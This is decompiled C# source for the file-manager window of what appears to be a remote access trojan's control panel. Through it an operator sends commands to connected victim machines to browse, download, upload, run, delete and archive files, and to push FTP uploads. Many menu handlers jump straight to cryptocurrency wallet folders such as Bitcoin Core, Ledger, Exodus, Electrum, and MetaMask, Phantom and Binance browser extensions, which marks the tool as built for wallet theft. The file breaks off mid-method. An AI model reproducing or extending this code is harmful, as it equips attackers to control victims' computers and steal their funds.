using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Server.Connection;
using Server.MessagePack;
using Server.Properties;

namespace Server.Forms
{
	// Token: 0x02000089 RID: 137
	public partial class FormFileManager : Form
	{
		// Token: 0x170000C2 RID: 194
		// (get) Token: 0x06000375 RID: 885 RVA: 0x00003F84 File Offset: 0x00002184
		// (set) Token: 0x06000376 RID: 886 RVA: 0x00003F8C File Offset: 0x0000218C
		public Form1 F { get; set; }

		// Token: 0x170000C3 RID: 195
		// (get) Token: 0x06000377 RID: 887 RVA: 0x00003F95 File Offset: 0x00002195
		// (set) Token: 0x06000378 RID: 888 RVA: 0x00003F9D File Offset: 0x0000219D
		internal Clients Client { get; set; }

		// Token: 0x170000C4 RID: 196
		// (get) Token: 0x06000379 RID: 889 RVA: 0x00003FA6 File Offset: 0x000021A6
		// (set) Token: 0x0600037A RID: 890 RVA: 0x00003FAE File Offset: 0x000021AE
		public string FullPath { get; set; }

		// Token: 0x0600037B RID: 891 RVA: 0x00003FB7 File Offset: 0x000021B7
		public FormFileManager()
		{
			this.InitializeComponent();
		}

		// Token: 0x0600037C RID: 892 RVA: 0x0002AC90 File Offset: 0x00028E90
		private void listView1_DoubleClick(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count == 1)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "getPath";
					msgPack.ForcePathObject("Path").AsString = this.listView1.SelectedItems[0].ToolTipText;
					this.listView1.Enabled = false;
					this.toolStripStatusLabel3.ForeColor = Color.Green;
					this.toolStripStatusLabel3.Text = "Please Wait";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600037D RID: 893 RVA: 0x0002AD68 File Offset: 0x00028F68
		private void backToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				string text = this.textBox1.Text;
				if (text.Length <= 3)
				{
					msgPack.ForcePathObject("Packet").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "getDrivers";
					this.textBox1.Text = "";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
				else
				{
					text = text.Remove(text.LastIndexOfAny(new char[]
					{
						'\\'
					}, text.LastIndexOf('\\')));
					msgPack.ForcePathObject("Packet").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "getPath";
					msgPack.ForcePathObject("Path").AsString = text + "\\";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "fileManager";
				msgPack2.ForcePathObject("Command").AsString = "getDrivers";
				this.textBox1.Text = "";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
			}
		}

		// Token: 0x0600037E RID: 894 RVA: 0x0002AEE0 File Offset: 0x000290E0
		private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					if (!Directory.Exists(Path.Combine(Application.StartupPath, "ClientsFolder\\" + this.Client.ID)))
					{
						Directory.CreateDirectory(Path.Combine(Application.StartupPath, "ClientsFolder\\" + this.Client.ID));
					}
					foreach (object obj in this.listView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						if (listViewItem.ImageIndex == 0 && listViewItem.ImageIndex == 1 && listViewItem.ImageIndex == 2)
						{
							break;
						}
						MsgPack msgPack = new MsgPack();
						string dwid = Guid.NewGuid().ToString();
						msgPack.ForcePathObject("Packet").AsString = "fileManager";
						msgPack.ForcePathObject("Command").AsString = "socketDownload";
						msgPack.ForcePathObject("File").AsString = listViewItem.ToolTipText;
						msgPack.ForcePathObject("DWID").AsString = dwid;
						ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
						base.BeginInvoke(new MethodInvoker(delegate()
						{
							if ((FormDownloadFile)Application.OpenForms["socketDownload:" + dwid] == null)
							{
								new FormDownloadFile
								{
									Name = "socketDownload:" + dwid,
									Text = "socketDownload:" + this.Client.ID,
									F = this.F,
									DirPath = this.FullPath
								}.Show();
							}
						}));
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600037F RID: 895 RVA: 0x0002B0A0 File Offset: 0x000292A0
		private void uPLOADToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.textBox1.Text.Length >= 3)
			{
				try
				{
					OpenFileDialog openFileDialog = new OpenFileDialog();
					openFileDialog.Multiselect = true;
					if (openFileDialog.ShowDialog() == DialogResult.OK)
					{
						foreach (string text in openFileDialog.FileNames)
						{
							if ((FormDownloadFile)Application.OpenForms["socketDownload:"] == null)
							{
								FormDownloadFile formDownloadFile = new FormDownloadFile
								{
									Name = "socketUpload:" + Guid.NewGuid().ToString(),
									Text = "socketUpload:" + this.Client.ID,
									F = Program.form1,
									Client = this.Client
								};
								formDownloadFile.FileSize = new FileInfo(text).Length;
								formDownloadFile.labelfile.Text = Path.GetFileName(text);
								formDownloadFile.FullFileName = text;
								formDownloadFile.label1.Text = "Upload:";
								formDownloadFile.ClientFullFileName = this.textBox1.Text + "\\" + Path.GetFileName(text);
								MsgPack msgPack = new MsgPack();
								msgPack.ForcePathObject("Packet").AsString = "fileManager";
								msgPack.ForcePathObject("Command").AsString = "reqUploadFile";
								msgPack.ForcePathObject("ID").AsString = formDownloadFile.Name;
								formDownloadFile.Show();
								ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
							}
						}
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000380 RID: 896 RVA: 0x0002B268 File Offset: 0x00029468
		private void dELETEToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					foreach (object obj in this.listView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						if (listViewItem.ImageIndex != 0 && listViewItem.ImageIndex != 1 && listViewItem.ImageIndex != 2)
						{
							MsgPack msgPack = new MsgPack();
							msgPack.ForcePathObject("Packet").AsString = "fileManager";
							msgPack.ForcePathObject("Command").AsString = "deleteFile";
							msgPack.ForcePathObject("File").AsString = listViewItem.ToolTipText;
							ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
						}
						else if (listViewItem.ImageIndex == 0)
						{
							MsgPack msgPack2 = new MsgPack();
							msgPack2.ForcePathObject("Packet").AsString = "fileManager";
							msgPack2.ForcePathObject("Command").AsString = "deleteFolder";
							msgPack2.ForcePathObject("Folder").AsString = listViewItem.ToolTipText;
							ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000381 RID: 897 RVA: 0x0002B3F4 File Offset: 0x000295F4
		private void rEFRESHToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.textBox1.Text != "")
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "getPath";
					msgPack.ForcePathObject("Path").AsString = this.textBox1.Text;
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
				else
				{
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "fileManager";
					msgPack2.ForcePathObject("Command").AsString = "getDrivers";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000382 RID: 898 RVA: 0x0002B4E4 File Offset: 0x000296E4
		private void eXECUTEToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					foreach (object obj in this.listView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						MsgPack msgPack = new MsgPack();
						msgPack.ForcePathObject("Packet").AsString = "fileManager";
						msgPack.ForcePathObject("Command").AsString = "execute";
						msgPack.ForcePathObject("File").AsString = listViewItem.ToolTipText;
						ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000383 RID: 899 RVA: 0x0002B5C8 File Offset: 0x000297C8
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.Client.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
				base.Close();
			}
		}

		// Token: 0x06000384 RID: 900 RVA: 0x0002B608 File Offset: 0x00029808
		private void DESKTOPToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "DESKTOP";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x06000385 RID: 901 RVA: 0x0002B68C File Offset: 0x0002988C
		private void APPDATAToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "APPDATA";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x06000386 RID: 902 RVA: 0x0002B710 File Offset: 0x00029910
		private void CreateFolderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Interaction.InputBox("Create Folder", "Name", Path.GetRandomFileName().Replace(".", ""), -1, -1);
				if (!string.IsNullOrEmpty(text))
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "createFolder";
					msgPack.ForcePathObject("Folder").AsString = Path.Combine(this.textBox1.Text, text);
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000387 RID: 903 RVA: 0x0002B7D0 File Offset: 0x000299D0
		private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					StringBuilder stringBuilder = new StringBuilder();
					foreach (object obj in this.listView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						stringBuilder.Append(listViewItem.ToolTipText + "-=>");
					}
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "copyFile";
					msgPack.ForcePathObject("File").AsString = stringBuilder.ToString();
					msgPack.ForcePathObject("IO").AsString = "copy";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000388 RID: 904 RVA: 0x0002B8E8 File Offset: 0x00029AE8
		private void PasteToolStripMenuItem_Click_1(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "pasteFile";
				msgPack.ForcePathObject("File").AsString = this.textBox1.Text;
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x06000389 RID: 905 RVA: 0x0002B974 File Offset: 0x00029B74
		private void RenameToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count == 1)
			{
				try
				{
					string text = Interaction.InputBox("Rename File or Folder", "Name", this.listView1.SelectedItems[0].Text, -1, -1);
					if (!string.IsNullOrEmpty(text))
					{
						if (this.listView1.SelectedItems[0].ImageIndex != 0 && this.listView1.SelectedItems[0].ImageIndex != 1 && this.listView1.SelectedItems[0].ImageIndex != 2)
						{
							MsgPack msgPack = new MsgPack();
							msgPack.ForcePathObject("Packet").AsString = "fileManager";
							msgPack.ForcePathObject("Command").AsString = "renameFile";
							msgPack.ForcePathObject("File").AsString = this.listView1.SelectedItems[0].ToolTipText;
							msgPack.ForcePathObject("NewName").AsString = Path.Combine(this.textBox1.Text, text);
							ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
						}
						else if (this.listView1.SelectedItems[0].ImageIndex == 0)
						{
							MsgPack msgPack2 = new MsgPack();
							msgPack2.ForcePathObject("Packet").AsString = "fileManager";
							msgPack2.ForcePathObject("Command").AsString = "renameFolder";
							msgPack2.ForcePathObject("Folder").AsString = this.listView1.SelectedItems[0].ToolTipText + "\\";
							msgPack2.ForcePathObject("NewName").AsString = Path.Combine(this.textBox1.Text, text);
							ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
						}
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x0600038A RID: 906 RVA: 0x0002BB94 File Offset: 0x00029D94
		private void UserProfileToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "USER";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x0600038B RID: 907 RVA: 0x00002287 File Offset: 0x00000487
		private void DriversListsToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600038C RID: 908 RVA: 0x0002BC18 File Offset: 0x00029E18
		private void OpenClientFolderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (!Directory.Exists(this.FullPath))
				{
					Directory.CreateDirectory(this.FullPath);
				}
				Process.Start(this.FullPath);
			}
			catch
			{
			}
		}

		// Token: 0x0600038D RID: 909 RVA: 0x00003FC5 File Offset: 0x000021C5
		private void FormFileManager_FormClosed(object sender, FormClosedEventArgs e)
		{
			ThreadPool.QueueUserWorkItem(delegate(object o)
			{
				Clients client = this.Client;
				if (client == null)
				{
					return;
				}
				client.Disconnected();
			});
		}

		// Token: 0x0600038E RID: 910 RVA: 0x0002BC60 File Offset: 0x00029E60
		private void CutToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					StringBuilder stringBuilder = new StringBuilder();
					foreach (object obj in this.listView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						stringBuilder.Append(listViewItem.ToolTipText + "-=>");
					}
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "copyFile";
					msgPack.ForcePathObject("File").AsString = stringBuilder.ToString();
					msgPack.ForcePathObject("IO").AsString = "cut";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600038F RID: 911 RVA: 0x0002BD78 File Offset: 0x00029F78
		private void ZipToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					StringBuilder stringBuilder = new StringBuilder();
					foreach (object obj in this.listView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						stringBuilder.Append(listViewItem.ToolTipText + "-=>");
					}
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "zip";
					msgPack.ForcePathObject("Path").AsString = stringBuilder.ToString();
					msgPack.ForcePathObject("Zip").AsString = "true";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000390 RID: 912 RVA: 0x0002BE90 File Offset: 0x0002A090
		private void UnzipToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					foreach (object obj in this.listView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						MsgPack msgPack = new MsgPack();
						msgPack.ForcePathObject("Packet").AsString = "fileManager";
						msgPack.ForcePathObject("Command").AsString = "zip";
						msgPack.ForcePathObject("Path").AsString = listViewItem.ToolTipText;
						msgPack.ForcePathObject("Zip").AsString = "false";
						ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000391 RID: 913 RVA: 0x0002BF90 File Offset: 0x0002A190
		private void InstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "fileManager";
			msgPack.ForcePathObject("Command").AsString = "installZip";
			msgPack.ForcePathObject("exe").SetAsBytes(Resources._7z);
			msgPack.ForcePathObject("dll").SetAsBytes(Resources._7z1);
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x06000392 RID: 914 RVA: 0x00002287 File Offset: 0x00000487
		private void button1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000393 RID: 915 RVA: 0x00002287 File Offset: 0x00000487
		private void button12_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000394 RID: 916 RVA: 0x00002287 File Offset: 0x00000487
		private void button8_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000395 RID: 917 RVA: 0x00002287 File Offset: 0x00000487
		private void button2_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000396 RID: 918 RVA: 0x00002287 File Offset: 0x00000487
		private void button3_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000397 RID: 919 RVA: 0x00002287 File Offset: 0x00000487
		private void button3_Click_1(object sender, EventArgs e)
		{
		}

		// Token: 0x06000398 RID: 920 RVA: 0x00002287 File Offset: 0x00000487
		private void button4_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000399 RID: 921 RVA: 0x00002287 File Offset: 0x00000487
		private void button5_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600039A RID: 922 RVA: 0x0002C014 File Offset: 0x0002A214
		private void xxToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "C:\\Users\\Public";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x0600039B RID: 923 RVA: 0x0002C098 File Offset: 0x0002A298
		private void cToolStripMenuItem_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "fileManager";
			msgPack.ForcePathObject("Command").AsString = "getPath";
			msgPack.ForcePathObject("Path").AsString = "c:\\";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x0600039C RID: 924 RVA: 0x00002287 File Offset: 0x00000487
		private void FormFileManager_Load(object sender, EventArgs e)
		{
		}

		// Token: 0x0600039D RID: 925 RVA: 0x0002C108 File Offset: 0x0002A308
		private void startupToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "STARTUP";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x0600039E RID: 926 RVA: 0x0002C18C File Offset: 0x0002A38C
		private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			using (FormFTP formFTP = new FormFTP())
			{
				formFTP.ShowDialog();
			}
		}

		// Token: 0x0600039F RID: 927 RVA: 0x0002C1C4 File Offset: 0x0002A3C4
		private void uploadToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					foreach (object obj in this.listView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						MsgPack msgPack = new MsgPack();
						msgPack.ForcePathObject("Packet").AsString = "fileManager";
						msgPack.ForcePathObject("Command").AsString = "ftpupload";
						msgPack.ForcePathObject("Path").AsString = listViewItem.ToolTipText;
						//msgPack.ForcePathObject("Host").AsString = Settings.Default.usdt;
						//msgPack.ForcePathObject("User").AsString = Settings.Default.ftpuser;
						//msgPack.ForcePathObject("Pass").AsString = Settings.Default.ftppass;
						//msgPack.ForcePathObject("Port").AsString = Settings.Default.ftpport;
						ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x060003A0 RID: 928 RVA: 0x00002287 File Offset: 0x00000487
		private void metaMaskToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060003A1 RID: 929 RVA: 0x0002C32C File Offset: 0x0002A52C
		private void bitcoinCoreToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "Bitcoin";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x060003A2 RID: 930 RVA: 0x0002C3B0 File Offset: 0x0002A5B0
		private void ledgerLiveToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "Ledger";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x060003A3 RID: 931 RVA: 0x0002C434 File Offset: 0x0002A634
		private void coinomiToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "Coinomi";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x060003A4 RID: 932 RVA: 0x0002C4B8 File Offset: 0x0002A6B8
		private void electrumToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "Electrum";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x060003A5 RID: 933 RVA: 0x0002C53C File Offset: 0x0002A73C
		private void exodusToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "Exodus";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x060003A6 RID: 934 RVA: 0x0002C5C0 File Offset: 0x0002A7C0
		private void atomicToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "Atomic";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x060003A7 RID: 935 RVA: 0x0002C644 File Offset: 0x0002A844
		private void f2AToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "F2a";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x060003A8 RID: 936 RVA: 0x0002C6C8 File Offset: 0x0002A8C8
		private void chromeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "MetaChrome";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x060003A9 RID: 937 RVA: 0x0002C74C File Offset: 0x0002A94C
		private void ergoWalletToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "ErgoWallet";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x060003AA RID: 938 RVA: 0x0002C7D0 File Offset: 0x0002A9D0
		private void edgeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "MetaEdge";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x060003AB RID: 939 RVA: 0x0002C854 File Offset: 0x0002AA54
		private void braveToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "MetaBrave";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x060003AC RID: 940 RVA: 0x0002C8D8 File Offset: 0x0002AAD8
		private void chromeToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "PhantomChrome";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x060003AD RID: 941 RVA: 0x0002C95C File Offset: 0x0002AB5C
		private void edgeToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "PhantomBrave";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x060003AE RID: 942 RVA: 0x0002C9E0 File Offset: 0x0002ABE0
		private void chromeToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "BinanceChrome";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x060003AF RID: 943 RVA: 0x0002CA64 File Offset: 0x0002AC64
		private void edgeToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "BinanceEdge";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x060003B0 RID: 944 RVA: 0x0002CAE8 File Offset: 0x0002ACE8
		private void chromeToolStripMenuItem3_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
